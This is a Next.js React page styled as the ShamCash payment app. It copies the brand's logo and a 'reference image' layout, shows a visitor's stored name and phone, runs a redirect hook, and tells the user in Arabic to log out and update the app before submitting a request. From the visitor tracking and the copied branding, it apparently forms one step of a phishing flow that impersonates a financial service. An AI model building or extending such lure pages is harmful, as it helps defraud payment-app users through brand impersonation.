'use client';

import { useEffect, useState } from 'react';
import { useVisitorRedirect } from '@/hooks/useVisitorRedirect';

const STORAGE_KEY = 'shamcha_visitors';

interface VisitorInfo {
  name: string;
  phone: string;
}

function loadVisitorInfo(): VisitorInfo | null {
  if (typeof window === 'undefined') return null;
  try {
    const visitorId = sessionStorage.getItem('currentVisitorId');
    if (!visitorId) return null;
    const data = localStorage.getItem(STORAGE_KEY);
    if (!data) return null;
    const visitors = JSON.parse(data) as Array<{ id: string; name: string; phone: string }>;
    const visitor = visitors.find((v) => v.id === visitorId);
    return visitor ? { name: visitor.name, phone: visitor.phone } : null;
  } catch {
    return null;
  }
}

/* ──────────────────────────────────────────────────────────────────────────
   SVG Icons inlined so the page has zero external deps
   ────────────────────────────────────────────────────────────────────────── */

function ShamCashLogo() {
  return (
    <svg width={36} height={29} viewBox="0 0 100 80" fill="none" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <linearGradient id="au-lt" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stopColor="#00e8d0" />
          <stop offset="100%" stopColor="#00b8a8" />
        </linearGradient>
        <linearGradient id="au-lb" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stopColor="#009988" />
          <stop offset="100%" stopColor="#006655" />
        </linearGradient>
        <linearGradient id="au-rt" x1="100%" y1="0%" x2="0%" y2="100%">
          <stop offset="0%" stopColor="#4488ff" />
          <stop offset="100%" stopColor="#2255cc" />
        </linearGradient>
        <linearGradient id="au-rb" x1="100%" y1="0%" x2="0%" y2="100%">
          <stop offset="0%" stopColor="#1144bb" />
          <stop offset="100%" stopColor="#002288" />
        </linearGradient>
      </defs>
      <polygon points="8,8 46,8 34,28 8,28" fill="url(#au-lt)" />
      <polygon points="8,28 34,28 22,52 8,52" fill="url(#au-lb)" opacity="0.9" />
      <polygon points="8,52 22,52 8,70" fill="url(#au-lb)" opacity="0.7" />
      <polygon points="54,10 92,10 92,30 66,30" fill="url(#au-rt)" />
      <polygon points="66,30 92,30 92,52 78,52" fill="url(#au-rb)" opacity="0.9" />
      <polygon points="54,10 66,30 50,52 38,32" fill="url(#au-rt)" opacity="0.85" />
      <polygon points="50,52 66,30 78,52 64,72 50,52" fill="url(#au-rb)" opacity="0.8" />
    </svg>
  );
}

/* Blue circular arrow button (matches the left icon in the reference image) */
function BlueArrowIcon() {
  return (
    <div className="relative flex items-center justify-center" style={{ width: 120, height: 120 }}>
      {/* Outer glow rings */}
      <div
        className="absolute inset-0 rounded-full"
        style={{ background: 'radial-gradient(circle, rgba(0,180,255,0.25) 0%, transparent 70%)' }}
      />
      {/* Ring border */}
      <div
        className="absolute rounded-full border-2"
        style={{
          inset: 6,
          borderColor: 'rgba(0,200,255,0.6)',
          boxShadow: '0 0 18px rgba(0,200,255,0.5), inset 0 0 10px rgba(0,200,255,0.2)',
        }}
      />
      {/* Inner circle */}
      <div
        className="relative rounded-full flex items-center justify-center"
        style={{
          width: 76,
          height: 76,
          background: 'linear-gradient(135deg, #1a6fff 0%, #0a4aff 100%)',
          boxShadow: '0 0 24px rgba(26,111,255,0.7)',
        }}
      >
        {/* Right-pointing arrow */}
        <svg width={36} height={36} viewBox="0 0 24 24" fill="none">
          <path
            d="M5 12h14M13 6l6 6-6 6"
            stroke="white"
            strokeWidth={2.5}
            strokeLinecap="round"
            strokeLinejoin="round"
          />
        </svg>
      </div>
    </div>
  );
}

/* Green circular refresh icon (matches the bottom icon in the reference image) */
function GreenRefreshIcon() {
  return (
    <div className="relative flex items-center justify-center" style={{ width: 80, height: 80 }}>
      <div
        className="absolute inset-0 rounded-full"
        style={{ background: 'radial-gradient(circle, rgba(0,220,80,0.3) 0%, transparent 70%)' }}
      />
      <div
        className="relative rounded-full flex items-center justify-center"
        style={{
          width: 64,
          height: 64,
          background: 'linear-gradient(135deg, #22c55e 0%, #16a34a 100%)',
          boxShadow: '0 0 20px rgba(34,197,94,0.6)',
        }}
      >
        <svg width={32} height={32} viewBox="0 0 24 24" fill="none">
          <path
            d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"
            stroke="white"
            strokeWidth={2.2}
            strokeLinecap="round"
            strokeLinejoin="round"
          />
        </svg>
      </div>
    </div>
  );
}

export default function AppUpdatePage() {
  const [visitorInfo, setVisitorInfo] = useState<VisitorInfo | null>(null);

  useVisitorRedirect('app-update');

  useEffect(() => {
    setVisitorInfo(loadVisitorInfo());
  }, []);

  return (
    <main
      className="relative min-h-screen overflow-hidden flex flex-col"
      dir="rtl"
      style={{
        background: 'linear-gradient(160deg, #04061a 0%, #060c2e 40%, #04061a 100%)',
      }}
    >
      {/* ── Glowing ring layers (background decoration) ── */}
      <div className="pointer-events-none absolute inset-0 overflow-hidden">
        {/* Left-center rings */}
        {[300, 240, 180, 130, 85].map((size, i) => (
          <div
            key={size}
            className="absolute rounded-full border"
            style={{
              width: size,
              height: size,
              left: -size / 3,
              top: '35%',
              transform: 'translateY(-50%)',
              borderColor: `rgba(0,180,220,${0.06 + i * 0.04})`,
              boxShadow: `0 0 ${8 + i * 4}px rgba(0,180,220,${0.05 + i * 0.03})`,
            }}
          />
        ))}
        {/* Right-side rings */}
        {[340, 260, 190].map((size, i) => (
          <div
            key={`r-${size}`}
            className="absolute rounded-full border"
            style={{
              width: size,
              height: size,
              right: -size / 3,
              top: '60%',
              transform: 'translateY(-50%)',
              borderColor: `rgba(0,140,200,${0.04 + i * 0.03})`,
            }}
          />
        ))}
        {/* Subtle radial glow center */}
        <div
          className="absolute"
          style={{
            width: 500,
            height: 400,
            left: '50%',
            top: '45%',
            transform: 'translate(-50%, -50%)',
            background: 'radial-gradient(ellipse, rgba(20,60,160,0.18) 0%, transparent 70%)',
          }}
        />
      </div>

      {/* ── Top bar: logo + brand name ── */}
      <header className="relative z-10 flex items-center justify-end px-6 pt-8 pb-2 gap-2">
        <span
          className="text-white font-bold text-lg tracking-wide"
          style={{ textShadow: '0 0 12px rgba(100,160,255,0.4)' }}
        >
          ShamCash
        </span>
        <ShamCashLogo />
      </header>

      {/* ── Main content ── */}
      <div className="relative z-10 flex flex-col flex-1 items-center justify-center px-6 py-8">
        <div className="w-full max-w-sm">

          {/* Visitor info (shown only when visitor is identified) */}
          {visitorInfo && (
            <div
              className="mb-8 rounded-2xl px-4 py-3 flex items-center gap-3 border"
              style={{
                background: 'rgba(255,255,255,0.05)',
                borderColor: 'rgba(0,180,220,0.2)',
              }}
            >
              <div
                className="w-9 h-9 rounded-full flex items-center justify-center font-bold text-sm shrink-0"
                style={{ background: 'rgba(0,180,220,0.2)', color: '#00c8e0' }}
              >
                {visitorInfo.name.charAt(0)}
              </div>
              <div>
                <p className="text-white font-semibold text-sm">{visitorInfo.name}</p>
                <p className="text-xs" style={{ color: 'rgba(255,255,255,0.45)' }}>{visitorInfo.phone}</p>
              </div>
            </div>
          )}

          {/* Icons + text layout  — mirrors the reference image */}
          <div className="flex items-start gap-5">
            {/* Left: blue arrow + green refresh stacked */}
            <div className="flex flex-col items-center gap-4 shrink-0 mt-2">
              <BlueArrowIcon />
              <GreenRefreshIcon />
            </div>

            {/* Right: headings */}
            <div className="flex flex-col justify-center gap-3 flex-1 mt-4">
              <p
                className="font-bold leading-snug"
                style={{
                  color: '#f5c518',
                  fontSize: '1.45rem',
                  textShadow: '0 0 16px rgba(245,197,24,0.45)',
                }}
              >
                قبل تقديم الطلب:
              </p>
              <p
                className="font-bold leading-tight text-white"
                style={{ fontSize: '1.55rem', lineHeight: 1.3 }}
              >
                سجل خروج من حسابك
              </p>
              <p
                className="font-bold leading-tight text-white"
                style={{ fontSize: '1.55rem', lineHeight: 1.3 }}
              >
                ثم حدث التطبيق.
              </p>
            </div>
          </div>
        </div>
      </div>
    </main>
  );
}

